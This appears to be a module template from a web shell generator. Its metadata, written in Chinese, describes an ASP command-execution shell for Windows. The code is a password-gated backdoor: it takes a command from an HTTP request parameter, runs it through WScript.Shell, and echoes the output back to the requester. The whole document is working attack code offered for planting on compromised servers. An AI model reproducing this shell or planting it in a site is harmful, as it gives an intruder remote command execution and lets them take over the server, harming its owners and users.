' MODULE = {"name": "asp_basic", "desc": "ASP 命令执行:wscript.shell exec 回显(Windows)", "category": "asp", "params": [["pass", "连接密码"], ["cmd_param", "命令参数名,默认 cmd"]]}
<% if request("pass")="{{pass}}" then
set s=createobject("wscript.shell")
set o=s.exec(request("{{cmd_param}}"))
response.write o.stdout.readall
end if %>
